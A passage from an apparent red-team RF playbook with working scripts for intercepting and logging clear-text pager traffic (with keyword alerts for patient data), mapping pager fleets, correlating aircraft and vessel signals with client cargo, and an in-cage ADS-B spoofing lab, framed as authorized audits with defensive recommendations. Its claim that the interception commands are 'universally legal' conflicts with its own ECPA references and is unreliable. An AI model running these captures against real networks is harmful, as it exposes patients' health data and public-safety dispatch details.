print(f"\nUnique vessels observed (60s): {len(vessels)}")
print(f"\nTop flag states (MID prefix):")
for mid, count in flag_counts.most_common(10):
    print(f"  MID {mid}: {count} vessels")
print(f"\nMessage types observed:")
for t, count in vessel_types.most_common(10):
    print(f"  Type {t}: {count}")

# Look for engagement-relevant anomalies
print(f"\nDark targets check: vessels with speed=0 but no position fix")
for mmsi, data in vessels.items():
    if data['lat'] is None and data['speed'] == 0:
        print(f"  MMSI {mmsi}: no position but transmitting")
PYEOF
```

### 2.4 Cross-Correlating RF with Cyber Activity

The red-team value is in correlating RF observations with the engagement target's own activities. For example:

```bash
# === Correlate aircraft movements with client cargo schedule ===
python3 << 'PYEOF'
"""Correlate observed ACARS traffic with engagement target's cargo manifest.

This is illustrative. Real correlation requires the client's cargo
schedule (provided under NDA as part of engagement scoping).
"""

# Hypothetical client cargo flights (engagement scope data)
client_flights = {
    'GT1234': '2026-06-21 cargo manifest ABC',
    'GT5678': '2026-06-21 cargo manifest DEF',
    'GT9012': '2026-06-21 cargo manifest GHI',
}

# Observed ACARS flights (from decoder)
observed = ['GT1234', 'AAL100', 'GT5678', 'UAL200', 'GT9012', 'DAL300']

# Correlate
matches = [f for f in observed if f in client_flights]
print(f"Observed {len(matches)} of {len(client_flights)} client cargo flights:")
for flight in matches:
    print(f"  {flight}: {client_flights[flight]}")

# OPSEC finding: anyone with a $30 RTL-SDR can observe client cargo flights
# and infer shipment schedules. Document as engagement finding.
print(f"\nOPSEC finding: {len(matches)} of {len(client_flights)} client flights")
print(f"were observable via clear-text ACARS at 131.550 MHz.")
print(f"Recommendation: encrypted ACARS (ARINC 822) or VPN over satellite.")
PYEOF
```

### 2.5 OPSEC Findings Template

```bash
# Generate an engagement OPSEC findings document from RF collection
cat > engagement_opsec_findings.md << 'EOF'
# RF OPSEC Findings - [Client] [Date]

## Collection summary
- **Site**: [airport/port name and GPS coordinates]
- **Duration**: [start] through [end] (e.g., 7 days)
- **Equipment**: RTL-SDR v3 x3, 1090 MHz collinear, VHF air discone, VHF marine antenna
- **Weather**: [brief note; weather affects VHF propagation]

## Aviation findings

### ADS-B traffic observed
- Total aircraft observed: [count]
- Unique ICAO24: [count]
- Client-related aircraft: [count and tail numbers]

### ACARS traffic observed
- Total messages: [count]
- Client-related messages: [count and summary]
- Sensitive content observed: [yes/no, with examples redacted]

### ATC voice observed
- Active frequencies: [list]
- Sensitive content: [redacted examples if any]

## Maritime findings

### AIS traffic observed
- Total vessels observed: [count]
- Unique MMSI: [count]
- Client-related vessels: [count and names]
- Dark targets: [count]

### Maritime VHF voice observed
- Active channels: [list]
- Sensitive content: [redacted examples if any]

## Recommendations

### Aviation OPSEC recommendations
1. **ADS-B**: unavoidable exposure (mandated broadcast); focus on minimizing callsign sensitivity
2. **ACARS**: migrate to encrypted ACARS over IP (ARINC 822) or VDL Mode 3 with encryption
3. **ATC voice**: unavoidable (mandatory safety comms); focus on operational OPSEC during comms

### Maritime OPSEC recommendations
1. **AIS**: unavoidable exposure (mandated broadcast for vessels > 300 GT)
2. **VHF voice**: train crew on OPSEC-aware communications; use secure messaging for sensitive ops
3. **Dark target monitoring**: deploy a passive AIS receiver to monitor for non-broadcasting vessels

## Evidence retained
- Raw I/Q recordings: [location, retention period]
- Decoded logs: [location, retention period]
- Per client retention policy: [reference]
EOF

cat engagement_opsec_findings.md
```

## Part 3: Pager Network Exploitation (POCSAG and FLEX)

### 3.1 Pager Protocol Overview

Despite the migration to smartphones, pager networks remain critical infrastructure in:

- **Hospitals**: physician paging for emergencies and PHI (HIPAA-covered)
- **Public safety**: fire/EMS dispatch (life-safety)
- **Utilities**: infrastructure alerts (SCADA-related)
- **Industrial**: plant floor and field technician dispatch
- **IT operations**: on-call escalation for critical systems

Pagers persist because they work where cellular does not (basement operating rooms, rural areas, disaster zones), they have days of battery life, and the receive infrastructure is cheap. The dominant protocols are:

- **POCSAG** (Post Office Code Standardization Advisory Group, CCIR Rec. 584): 512, 1200, 2400 bps, 2-FSK modulation
- **FLEX** (Motorola proprietary): 1600, 3200, 6400 bps, 4-FSK modulation, more robust than POCSAG
- **ERMES** (European): 6250 bps, 4-FSK, mostly displaced by FLEX in Europe

Both POCSAG and FLEX are unencrypted. The security posture is identical: anyone with a $30 RTL-SDR can read every pager message within range.

### 3.2 Pager Frequency Survey

```bash
# Pager frequencies vary by region. Common allocations:

# US / Canada (Part 90 paging):
#   138-174 MHz VHF (e.g., 157.775 MHz is common)
#   440-470 MHz UHF (e.g., 454.x and 462.x MHz)
#   929-932 MHz (high-band paging, FLEX common)

# European:
#   169 MHz band
#   466 MHz band

# Survey the pager bands to find local activity
rtl_power -d 0 -f 929M:932M:25k -i 5 -e 300 -g 40 pager_929_survey.csv &
rtl_power -d 1 -f 157M:160M:25k -i 5 -e 300 -g 40 pager_157_survey.csv &
rtl_power -d 2 -f 454M:468M:25k -i 5 -e 300 -g 40 pager_454_survey.csv &
wait

# Identify active paging channels
python3 << 'PYEOF'
import csv, statistics
from collections import defaultdict

for path, band in [('pager_929_survey.csv', '929 MHz high-band'),
                   ('pager_157_survey.csv', '157 MHz VHF'),
                   ('pager_454_survey.csv', '454 MHz UHF')]:
    band_powers = defaultdict(list)
    try:
        with open(path) as f:
            for row in csv.reader(f):
                if len(row) > 6:
                    freq_low = float(row[2]) / 1e6
                    power = float(row[6])
                    band_powers[round(freq_low, 3)].append(power)
    except FileNotFoundError:
        print(f"No survey file {path}")
        continue

    active = sorted([(f, statistics.mean(p)) for f, p in band_powers.items() if statistics.mean(p) > -50],
                    key=lambda x: -x[1])
    print(f"\n{band} active paging channels:")
    for freq, power in active[:10]:
        print(f"  {freq:.3f} MHz : {power:.1f} dB")
PYEOF
```

### 3.3 POCSAG and FLEX Decoding

```bash
# multimon-ng decodes both POCSAG and FLEX from demodulated audio

# POCSAG decode at 157.775 MHz (1200 bps common)
rtl_fm -d 0 -f 157775000 -s 22050 -g 40 - | \
  multimon-ng -t raw -a POCSAG512 -a POCSAG1200 -a POCSAG2400 -f alpha - | \
  tee pocsag_157775.log

# Note: -f alpha enables alpha-numeric decoding (the actual text messages)
# Numeric-only pagers will only show numbers

# FLEX decode at 929-932 MHz (requires multimon-ng built with -DFLEX_SUPPORT=ON)
# Check FLEX support:
multimon-ng --help 2>&1 | grep -i flex
# If FLEX not in the list, rebuild multimon-ng from source:
#   git clone https://github.com/EliasOenal/multimon-ng.git
#   cd multimon-ng && mkdir build && cd build
#   cmake -DFLEX_SUPPORT=ON ..
#   make -j4 && sudo make install

rtl_fm -d 0 -f 931250000 -s 22050 -g 40 - | \
  multimon-ng -t raw -a FLEX -f alpha - | \
  tee flex_929.log
```

```bash
# Continuous capture with timestamped logging
python3 << 'PYEOF'
"""Continuously decode POCSAG/FLEX and tag messages with timestamps.

Output goes to pager_capture.log with one message per line.
"""
import subprocess, sys, time, re
from datetime import datetime

LOG_PATH = 'pager_capture.log'

def parse_multimon_line(line):
    """Extract pager message from multimon-ng output."""
    # multimon-ng POCSAG output format examples:
    #   POCSAG512: Address: 12345  Function: 0  Alpha:   Hello World
    #   POCSAG1200: Address: 12345  Function: 0  Alpha:   Emergency: MRN 12345
    match = re.search(r'POCSAG\d+:\s+Address:\s+(\d+)\s+Function:\s+(\d+)\s+Alpha:\s+(.*)', line)
    if match:
        return {
            'protocol': 'POCSAG',
            'address': match.group(1),
            'function': match.group(2),
            'message': match.group(3).strip(),
        }
    match = re.search(r'FLEX:\s+Address:\s+(\d+)\s+.*?Alpha:\s+(.*)', line)
    if match:
        return {
            'protocol': 'FLEX',
            'address': match.group(1),
            'function': '',
            'message': match.group(2).strip(),
        }
    return None

# Run multimon-ng and parse output
cmd = ['multimon-ng', '-t', 'raw', '-a', 'POCSAG1200', '-a', 'FLEX', '-f', 'alpha', '-']
rtl_fm = subprocess.Popen(
    ['rtl_fm', '-d', '0', '-f', '157775000', '-s', '22050', '-g', '40', '-'],
    stdout=subprocess.PIPE
)
multimon = subprocess.Popen(cmd, stdin=rtl_fm.stdout, stdout=subprocess.PIPE,
                            stderr=subprocess.DEVNULL, text=True)

print(f"Capturing pager messages to {LOG_PATH} (Ctrl-C to stop)")
with open(LOG_PATH, 'a') as log:
    try:
        for line in multimon.stdout:
            parsed = parse_multimon_line(line)
            if parsed:
                timestamp = datetime.utcnow().isoformat() + 'Z'
                log_entry = f"{timestamp} {parsed['protocol']} addr={parsed['address']} fn={parsed['function']} msg={parsed['message']}\n"
                log.write(log_entry)
                log.flush()
                # Real-time PHI check
                if any(kw in parsed['message'].upper() for kw in ['MRN', 'ROOM', 'DR ', 'PATIENT', 'PHYSICIAN']):
                    print(f"PHI ALERT: {log_entry.strip()}")
    except KeyboardInterrupt:
        print("\nStopping capture")
    finally:
        multimon.terminate()
        rtl_fm.terminate()
PYEOF
```

### 3.4 HIPAA Pager Audit (Hospital Engagement)

For a hospital HIPAA engagement, the deliverable is a quantified PHI exposure rate across the pager fleet.

```bash
# === 7-day HIPAA pager audit ===
# Capture all pager traffic for 7 days (168 hours)
DAYS=7
HOURS=$((DAYS * 24))

# Long-running capture (use nohup or systemd service for production)
nohup bash -c '
  while true; do
    rtl_fm -d 0 -f 157775000 -s 22050 -g 40 - 2>/dev/null | \
      multimon-ng -t raw -a POCSAG1200 -a FLEX -f alpha - 2>/dev/null
    echo "$(date) - decoder exited, restarting in 5s" >> pager_audit.log
    sleep 5
  done
' >> pager_capture.log 2>&1 &
CAPTURE_PID=$!
echo "Pager capture started, PID=$CAPTURE_PID"
echo "Will run for $DAYS days ($HOURS hours)"
echo "Monitor with: tail -f pager_capture.log"
```

```bash
# === HIPAA PHI exposure analysis ===
python3 << 'PYEOF'
"""Analyze captured pager messages for HIPAA PHI exposure.

Categories of PHI to detect:
- Patient names (Last, First or First Last patterns)
- Medical record numbers (MRN)
- Room numbers
- Phone numbers (often callbacks to wards)
- Physician names
- Diagnoses (limited set; full diagnosis detection needs NLP)
- Dates of birth
- Social security numbers
"""
import re
from collections import Counter, defaultdict
from datetime import datetime

LOG_PATH = 'pager_capture.log'

# PHI patterns (extend based on observed patterns at the site)
PHI_PATTERNS = [
    (r'\bMRN[:\s]*\d{4,10}\b', 'MRN'),
    (r'\bROOM[:\s]*\w?\d+\b', 'ROOM'),
    (r'\bDR[\.\s]+[A-Z][a-z]+\b', 'PHYSICIAN'),
    (r'\b[A-Z][a-z]+,\s*[A-Z][a-z]+\b', 'NAME_LF'),  # Last, First
    (r'\b\d{3}-\d{3}-\d{4}\b', 'PHONE'),
    (r'\b\d{1,2}/\d{1,2}/\d{2,4}\b', 'DATE'),
    (r'\b\d{3}-\d{2}-\d{4}\b', 'SSN'),
    (r'\bPATIENT[:\s]*\w+', 'PATIENT_REF'),
    (r'\bICU|ER|ED|CCU|MICU|SICU\b', 'UNIT'),  # Care unit references
]

messages = []
with open(LOG_PATH) as f:
    for line in f:
        parts = line.strip().split(' ', 4)
        if len(parts) < 5:
            continue
        timestamp, protocol, addr_str, fn_str, msg = parts[0], parts[1], parts[2], parts[3], parts[4]
        messages.append({
            'timestamp': timestamp,
            'protocol': protocol,
            'address': addr_str.split('=')[1] if '=' in addr_str else '',
            'message': msg.split('=', 1)[1] if '=' in msg else msg,
        })

print(f"Total messages captured: {len(messages)}")

# Classify each message
phi_messages = []
phi_categories = Counter()
phi_by_pager = defaultdict(int)

for m in messages:
    detected = []
    for pattern, category in PHI_PATTERNS:
        if re.search(pattern, m['message'], flags=re.IGNORECASE):
            detected.append(category)
    if detected:
        phi_messages.append({**m, 'categories': detected})
        for c in detected:
            phi_categories[c] += 1
        phi_by_pager[m['address']] += 1

phi_rate = (len(phi_messages) / len(messages) * 100) if messages else 0
print(f"PHI-bearing messages: {len(phi_messages)} ({phi_rate:.1f}%)")
print(f"\nPHI category breakdown:")
for cat, count in phi_categories.most_common():
    print(f"  {cat}: {count}")

print(f"\nTop 10 pagers by PHI volume:")
for pager, count in sorted(phi_by_pager.items(), key=lambda x: -x[1])[:10]:
    print(f"  Pager {pager}: {count} PHI messages")

# HIPAA report
print(f"\n=== HIPAA Pager Audit Summary ===")
print(f"Audit period: {messages[0]['timestamp'] if messages else 'N/A'} to {messages[-1]['timestamp'] if messages else 'N/A'}")
print(f"Total pager messages: {len(messages)}")
print(f"PHI exposure rate: {phi_rate:.1f}%")
print(f"PHI categories detected: {dict(phi_categories)}")
print(f"\nRecommendation: migrate to encrypted paging or secure mobile messaging.")
print(f"Short-term: ensure PHI patterns are removed from automated paging systems.")
PYEOF
```

### 3.5 Public Safety Dispatch OPSEC Audit

For a public-safety engagement (fire/EMS dispatch), the deliverable is OPSEC findings about dispatch data exposure.

```bash
# Public safety pager frequencies (US examples)
#   152.x, 158.x, 159.x MHz VHF
#   460.x, 462.x MHz UHF
#   929-932 MHz FLEX

# Survey, capture, and analyze for dispatch patterns
python3 << 'PYEOF'
"""Public-safety dispatch OPSEC analyzer.

Detects:
- Dispatch addresses (often include full street address)
- Call type disclosure (e.g., 'STRUCTURE FIRE', 'MVA', 'CARDIAC ARREST')
- Unit assignments (e.g., 'E12, T4, M7' = engine 12, truck 4, medic 7)
- Patient information (in EMS dispatch)
"""
import re
from collections import Counter

# Sample dispatch patterns
DISPATCH_PATTERNS = [
    (r'\b\d+\s+[A-Z][a-z]+\s+(?:ST|AVE|BLVD|RD|DR|LN|CT|WAY)\b', 'ADDRESS'),
    (r'\bSTRUCTURE FIRE|WORKING FIRE|ALARM|MV[A]?|MVC|CARDIAC|RESPIRATORY|STROKE|SEIZURE\b',
     'CALL_TYPE'),
    (r'\bE\d+|T\d+|M\d+|A\d+|BAT\d+|CHIEF\b', 'UNIT_ASSIGNMENT'),
    (r'\bMALE|FEMALE|\d{1,3}\s*YOM|\d{1,3}\s*YOF\b', 'PATIENT_DESCRIPTOR'),
    (r'\bGSW|STAB|TRAUMA|ARREST|UNCONSCIOUS\b', 'MEDICAL_TERM'),
]

with open('pager_capture.log') as f:
    lines = f.readlines()

category_counts = Counter()
sensitive_examples = {pattern_label: [] for _, pattern_label in DISPATCH_PATTERNS}

for line in lines:
    parts = line.strip().split(' ', 4)
    if len(parts) < 5:
        continue
    msg = parts[4].split('=', 1)[1] if '=' in parts[4] else parts[4]
    for pattern, label in DISPATCH_PATTERNS:
        if re.search(pattern, msg, flags=re.IGNORECASE):
            category_counts[label] += 1
            if len(sensitive_examples[label]) < 3:
                # Redact the example for the report
                redacted = re.sub(pattern, f'[{label}]', msg, flags=re.IGNORECASE)
                sensitive_examples[label].append(redacted[:100])

print("=== Public Safety Dispatch OPSEC Summary ===")
for cat, count in category_counts.most_common():
    print(f"\n{cat}: {count} occurrences")
    for ex in sensitive_examples[cat]:
        print(f"  Example: {ex}")

print("\n=== Recommendations ===")
print("1. Migrate dispatch paging to encrypted protocol (P25 Phase II encrypted, TETRA)")
print("2. Use pager aliases instead of full addresses for sensitive calls")
print("3. Move patient descriptors to a separate secure channel")
print("4. Quarterly audit of dispatch pager content for OPSEC drift")
PYEOF
```

### 3.6 Pager Network Reconnaissance

For engagements that include pager network mapping, document the pager fleet composition.

```bash
# === Map the pager fleet ===
python3 << 'PYEOF'
"""Map observed pager fleet by address and traffic volume.

Identifies:
- High-volume pagers (likely dispatch / system alerts)
- Low-volume pagers (likely individual users)
- Periodic transmitters (likely automated monitoring)
"""
from collections import Counter, defaultdict
from datetime import datetime
import re

# Parse capture
pager_traffic = Counter()
pager_first_seen = {}
pager_last_seen = {}
pager_messages = defaultdict(list)

with open('pager_capture.log') as f:
    for line in f:
        parts = line.strip().split(' ', 4)
        if len(parts) < 5:
            continue
        timestamp, protocol, addr_str, fn_str, msg = parts
        addr = addr_str.split('=')[1] if '=' in addr_str else ''
        msg_text = msg.split('=', 1)[1] if '=' in msg else msg

        pager_traffic[addr] += 1
        if addr not in pager_first_seen:
            pager_first_seen[addr] = timestamp
        pager_last_seen[addr] = timestamp
        if len(pager_messages[addr]) < 5:
            pager_messages[addr].append(msg_text[:80])

# Categorize
total = sum(pager_traffic.values())
print(f"Total messages: {total}")
print(f"Unique pager addresses: {len(pager_traffic)}")
print(f"\nTop 20 pagers by traffic volume:")
for addr, count in pager_traffic.most_common(20):
    pct = (count / total) * 100
    duration = 'unknown'
    if addr in pager_first_seen and addr in pager_last_seen:
        duration = f"{pager_first_seen[addr]} to {pager_last_seen[addr]}"
    print(f"  {addr}: {count} msgs ({pct:.1f}%) - {duration}")

# Identify dispatch-type pagers (high volume, regular cadence)
print(f"\nLikely dispatch pagers (>100 msgs in capture window):")
for addr, count in pager_traffic.most_common():
    if count > 100:
        print(f"  {addr}: {count} msgs")
        for msg in pager_messages[addr][:3]:
            print(f"    e.g.: {msg}")
PYEOF
```

### 3.7 Pager Protocol Reverse Engineering

For engagements that encounter non-standard pager protocols (custom FSK encoding, vendor-specific framing), the URH (Universal Radio Hacker) workflow applies.

```bash
# Capture raw I/Q of an unknown pager signal
rtl_sdr -d 0 -f 157775000 -s 1024000 -g 40 -e 5 unknown_pager.iq

# Load in URH for interactive analysis
urh /path/to/unknown_pager.iq

# In URH:
# 1. Set modulation to FSK
# 2. Auto-detect bit rate, samples per bit, center frequency
# 3. View bit stream to identify frame markers
# 4. Compare across multiple captures to identify address and message fields

# Document the protocol for the engagement report
python3 << 'PYEOF'
"""Document an unknown pager protocol for the engagement report."""
import json

protocol = {
    "name": "Custom FSK pager protocol (vendor XYZ)",
    "frequency_mhz": 157.775,
    "modulation": "2-FSK",
    "baud_rate": 1200,
    "deviation_hz": 4500,
    "samples_per_bit": 18,
    "frame_structure": {
        "preamble": "24 bits of 0xAA alternating",
        "sync_word": "0x7E (HDLC flag)",
        "address_field": "16 bits, big-endian",
        "function_bits": "2 bits (0-3, indicates alert tone)",
        "message_field": "variable length, ASCII",
        "crc": "CRC-16-CCITT",
    },
    "detection_method": "URH auto-detection + manual bit alignment",
    "notes": "Vendor-specific protocol used by [client] pagers. "
             "Decoded using URH and validated against vendor documentation "
             "(provided under NDA).",
}

print(json.dumps(protocol, indent=2))
PYEOF
```

### 3.8 Pager OPSEC Findings Template

```bash
cat > pager_opsec_findings.md << 'EOF'
# Pager Network OPSEC Findings - [Client] [Date]

## Executive summary
[Client]'s pager fleet transmits [N]% of messages containing PHI, dispatch
addresses, or other sensitive content in clear text on [frequency] MHz.
This traffic is readable by anyone within [range] miles using a $30 receiver.

## Capture details
- **Site**: [location and coordinates]
- **Duration**: [start] through [end]
- **Frequencies monitored**: [list, e.g., 157.775 MHz, 929.125 MHz]
- **Protocols observed**: POCSAG-1200, FLEX-6400

## Fleet composition
- **Total unique pager addresses**: [count]
- **Total messages captured**: [count]
- **Estimated fleet size**: [count, based on observed addresses]
- **High-volume pagers (likely dispatch)**: [count]

## PHI / sensitive content exposure
- **Messages with PHI patterns**: [count] ([percent]%)
- **PHI categories**:
  - Patient names: [count]
  - MRN references: [count]
  - Physician names: [count]
  - Room/unit references: [count]
  - Phone numbers: [count]
- **Examples (redacted)**:
  - [REDACTED example 1]
  - [REDACTED example 2]
  - [REDACTED example 3]

## Recommendations

### Short-term (0-30 days)
1. Audit automated paging scripts for PHI content; remove PHI before send
2. Train clinical and dispatch staff on pager OPSEC
3. Restrict high-volume dispatch pagers to non-PHI content (use codes)

### Medium-term (30-90 days)
1. Pilot encrypted paging for highest-PHI workflows (clinical comms)
2. Establish quarterly PHI audit as ongoing control
3. Document pager data retention and secure deletion procedures

### Long-term (90+ days)
1. Migrate to secure mobile messaging (HIPAA-compliant: TigerConnect, Vocera, etc.)
2. Decommission clear-text pager fleet where cellular coverage permits
3. Retain pagers only for fallback / disaster scenarios

## Regulatory references
- HIPAA Security Rule 45 CFR 164.312(e)(1) - transmission security
- HIPAA Privacy Rule 45 CFR 164.502 - uses and disclosures of PHI
- FCC Part 90 - private land mobile paging service rules
EOF

cat pager_opsec_findings.md
```

## Part 4: Hands-On Lab Exercises

The following exercises walk through the three workflows end-to-end. Each is designed for a 1-2 day lab session with the hardware specified in the main playbook.

### Exercise 1: ADS-B Spoofing Lab (4 hours)

**Objective**: Demonstrate that ADS-B has no cryptographic authentication by injecting a ghost aircraft into an in-cage dump1090 receiver.

**Prerequisites**:

- Verified Faraday cage (per Part 1.3)
- HackRF One + RTL-SDR v3
- dump1090, hackrf_transfer, pyModeS, gr-adsb installed

**Steps**:

1. Verify cage containment (30 minutes)
2. Launch dump1090 receiver inside cage (5 minutes)
3. Craft ghost aircraft I/Q (60 minutes)
4. Transmit and observe (15 minutes)
5. Capture evidence and document (30 minutes)
6. Clean up and verify cage clear (10 minutes)

**Success criteria**:

- Ghost aircraft appears on dump1090 map within 2 seconds of TX start
- Ghost aircraft disappears within 10 seconds of TX stop
- Outside-cage leakage monitor shows < 3 dB delta throughout
- Authorization checklist (Part 1.7) is complete

**Exercise log template**:

```bash
# Exercise 1 log
cat > exercise_1_adspb_spoofing.md << 'EOF'
# Exercise 1: ADS-B Spoofing Lab Log

## Date / time
- Start: [timestamp]
- End: [timestamp]
- Operator: [name]
- Authorization ref: [engagement letter section]

## Equipment
- Cage: [model / serial]
- TX SDR: HackRF One [serial]
- RX SDR: RTL-SDR v3 [serial]
- Monitor SDR (outside cage): RTL-SDR v3 [serial]

## Cage verification result
- Baseline mean power: [dB]
- During-TX mean power: [dB]
- Delta: [dB]
- Result: [VERIFIED / LEAKAGE]

## Ghost aircraft parameters
- ICAO24: A1B2C3 (fictional)
- Callsign: GHOST1
- Position: [lat, lon]
- Altitude: 35000 ft

## Demonstration results
- Time to first detection: [seconds]
- Total transmissions: [count]
- Outside-cage leakage: [max delta dB]
- Screenshot of dump1090 map: [reference]

## Anomalies / issues
- [any unexpected behavior]

## Cleanup verification
- TX equipment powered off: [yes/no]
- Cage interior checked: [yes/no]
- Outside cage spectrum clean: [yes/no]
EOF
```

### Exercise 2: Aviation OPSEC Collection (6 hours)

**Objective**: From a fixed vantage point, collect 4 hours of ADS-B + ACARS + ATC voice, then produce an OPSEC findings report.

**Prerequisites**:

- Outdoor vantage point with sky visibility (rooftop preferred)
- 2-3 RTL-SDR v3 dongles + dedicated antennas
- dump1090, acarsdec, rtl_fm, sox installed
- No transmission required (legal in most jurisdictions)

**Steps**:

1. Site survey (30 min): verify line of sight, document GPS, photograph antenna placement
2. Hardware setup (30 min): antennas, SDRs, laptops, weatherproofing
3. Baseline capture (4 hours): dump1090 + acarsdec + ATC voice sweep
4. Analysis (60 min): run analysis scripts (Part 2.2)
5. Report generation (30 min): fill in OPSEC findings template (Part 2.5)

**Success criteria**:

- At least 100 unique aircraft observed
- At least 50 ACARS messages captured
- At least 3 active ATC voice frequencies identified
- OPSEC findings document complete with examples (redacted)

### Exercise 3: HIPAA Pager Audit (1-2 weeks)

**Objective**: Capture 7-14 days of hospital pager traffic and produce a quantified PHI exposure report.

**Prerequisites**:

- Authorized engagement with HIPAA Business Associate Agreement (BAA) in place
- Vantage point within pager transmitter range (typically 25+ miles)
- RTL-SDR v3 + VHF or UHF vertical antenna
- multimon-ng with FLEX support

**Steps**:

1. Frequency survey (Part 3.2): identify hospital pager frequencies (2 hours)
2. Capture deployment (Day 0): install continuous capture, verify operation (4 hours)
3. Continuous capture (Days 1-7): monitor, restart decoder on failure (daily check)
4. PHI analysis (Day 8): run PHI analyzer (Part 3.4) (2 hours)
5. Report generation (Day 8): fill in HIPAA pager audit template (Part 3.4) (2 hours)
6. Data destruction (Day 9): securely delete raw captures per client retention policy

**Success criteria**:

- Continuous capture with < 5% downtime for 7 days
- Minimum 1000 messages captured
- PHI exposure rate quantified (typical range: 10-50%)
- HIPAA-compliant report delivered with redacted examples

## Part 5: Defensive Recommendations

### 5.1 For Aviation Facility Operators

- **Cross-validation**: deploy MLAT receivers to detect ADS-B spoofing (Part 1.6)
- **Behavior-based detection**: implement anomaly detection for impossible speeds/altitudes (Part 1.6)
- **ACARS OPSEC**: migrate to encrypted ACARS over IP (ARINC 822) or VDL Mode 3
- **ATC voice OPSEC**: train operations staff on OPSEC-aware radio discipline
- **Documentation**: maintain an aviation RF OPSEC baseline for the facility

### 5.2 For Maritime Facility Operators

- **Dark target monitoring**: deploy a passive AIS receiver to log non-broadcasting vessels
- **Cross-validation**: correlate AIS positions with radar and visual confirmation
- **VHF voice OPSEC**: train crews on OPSEC-aware communications; use secure messaging for sensitive ops
- **DSC false alert awareness**: train operators to recognize and respond to false DSC alerts
- **Coordination**: participate in regional maritime OPSEC information sharing

### 5.3 For Healthcare Facility Operators (HIPAA)

- **PHI audit**: quarterly pager PHI audit per Part 3.4
- **Migration planning**: develop multi-year plan to migrate from clear-text pagers to secure messaging
- **Clinical OPSEC training**: include pager PHI in annual HIPAA training
- **Vendor management**: ensure paging vendor supports encrypted paging (even if not currently used)
- **Incident response**: have a documented procedure for pager PHI breaches

### 5.4 For Public Safety Facility Operators

- **Dispatch OPSEC audit**: annual audit of dispatch pager content per Part 3.5
- **Encrypted dispatch**: migrate to encrypted P25 Phase II or TETRA for dispatch voice and data
- **Code-based dispatch**: use tactical codes instead of plain-language call types where operationally feasible
- **Mutual aid coordination**: coordinate OPSEC practices with mutual aid partners
- **Training**: include pager OPSEC in dispatcher training curriculum

## Part 6: References and Further Reading

### Academic and Research Papers

- Povolny, P. & Wang, S. (2012). "On the Security of the ADS-B Protocol." - seminal ADS-B security analysis
- Costin, A. & Francillon, A. (2012). "Ghost in the Air (Rerouted): On ADS-B and ATC Vulnerabilities." - ADS-B attacks with low-cost hardware
- Costin, A. (2012+). Continued aircraft protocol research including Mode S and VDL Mode 2
- Trend Micro Forward-Looking Threat Research (2019-2020). Maritime AIS spoofing documentation
- Schafer, M. et al. (various). Experimental analysis of ADS-B and AIS security

### DEF CON and Conference Presentations

- Barisani, A. & Mancini, M. (DEF CON 18). "Pager networks: intercepting messages nationwide." - PHI exposure documentation
- Phaedrus (DEF CON 22). "Plane Spotters Guide to Hacking Aircraft." - ACARS and VDL Mode 2 attacker perspective
- O'Neil, M. (ShmooCon 2011). "AIS: The Not-So-Automatic Identification System." - early AIS spoofing demonstration
- Hitchen, M. & Foster, N. (various). ADS-B security research at USENIX Security

### Standards Documents

- **ICAO Annex 10**: Aeronautical Telecommunications (ADS-B, VDL Mode 2, HFDL, ATC voice)
- **ITU-R M.1371-5**: Technical characteristics of AIS (Automatic Identification System)
- **ITU-R M.493**: Digital Selective Calling (DSC) system specifications
- **RTCA DO-260A/B**: ADS-B SARPS (Standards and Recommended Practices)
- **RTCA DO-224C**: VDL Mode 2 standards
- **ARINC 618/622**: ACARS protocol specifications
- **ARINC 822**: ACARS over IP (marked for encryption extension)
- **POCSAG**: Post Office Code Standardization Advisory Group (BC/RC/CCIR Recommendation 584)
- **Motorola FLEX**: FLEX protocol reference documentation

### Tool Documentation

- **pyModeS**: https://github.com/junzis/pyModeS - Python ADS-B decoder and encoder
- **pyais**: https://github.com/M0r13n/pyais - Python AIS decoder and encoder
- **gr-adsb**: GNU Radio ADS-B Out-of-Tree module (transmit-side research)
- **gr-ais**: GNU Radio AIS Out-of-Tree module (transmit-side research)
- **dump1090-mutability**: https://github.com/adsbxchange/dump1090-mutability
- **readsb**: https://github.com/wiedehopf/readsb
- **AIS-catcher**: https://github.com/jvde-github/AIS-catcher
- **multimon-ng**: https://github.com/EliasOenal/multimon-ng
- **dumpvdl2**: https://github.com/szpajder/dumpvdl2
- **dumphfdl**: https://github.com/szpajder/dumphfdl
- **direwolf**: https://github.com/wb2osz/direwolf
- **fldigi**: https://sourceforge.net/projects/fldigi/
- **URH (Universal Radio Hacker)**: https://github.com/jopohl/urh
- **GNU Radio**: https://www.gnuradio.org/

### Regulatory References

- **FCC Part 80**: Maritime stations (AIS, VHF voice, DSC)
- **FCC Part 87**: Aviation stations (ADS-B, ACARS, VDL Mode 2, ATC voice, NDB)
- **FCC Part 90**: Private land mobile (public safety paging)
- **FCC Part 97**: Amateur radio (APRS, amateur VHF/UHF)
- **47 USC 301**: Requirement for FCC license to transmit
- **47 USC 605**: Unauthorized interception and disclosure of radio communications
- **HIPAA Security Rule**: 45 CFR 164.312 (transmission security)
- **HIPAA Privacy Rule**: 45 CFR 164.502 (uses and disclosures of PHI)
- **ECPA**: Electronic Communications Privacy Act, 18 USC 2510-2523
- **Wireless Telegraphy Act 2006 (UK)**: Unauthorized reception of certain transmissions
- **GDPR (EU)**: General Data Protection Regulation, applies to personal data in decoded traffic

### Online Communities and Resources

- **RTL-SDR.com**: community blog and tutorials - https://rtl-sdr.com
- **ADS-B Exchange**: unfiltered ADS-B aggregator - https://adsbexchange.com
- **FlightAware PiAware**: ADS-B receiver program - https://flightaware.com/adsb/piaware
- **MarineTraffic**: global vessel tracking - https://marinetraffic.com
- **VesselFinder**: alternative vessel tracking - https://vesselfinder.com
- **FAA Aircraft Registry**: ICAO24 to aircraft registration lookup - https://registry.faa.gov/AircraftInquiry
- **ITU MMSI Database**: Maritime Mobile Service Identity country lookup
- **ACARS Dispatcher's Guide** (industry): reference for ACARS message labels

## Conclusion

This deep dive extends the licensed-band playbook with three engagement-critical workflows. Each addresses a recurring client need:

- **Spoofing lab**: makes the protocol-security threat model tangible for executives who control budget for cryptographic-authentication migrations
- **Aviation/maritime OPSEC**: provides a low-risk, high-value red-team deliverable for facility assessments
- **Pager exploitation**: addresses a persistent HIPAA and public-safety OPSEC gap that most clients underestimate

The defining principle throughout is **asymmetry**: receivers map aircraft, vessels, and pagers without transmitting a single photon, while transmitters face severe legal consequences for unauthorized operation. Every transmit-side command in this guide is gated by Faraday-cage containment and explicit authorization. The receive-side commands -- which constitute 90% of engagement value -- are universally legal and should be the default for any licensed-band assessment.

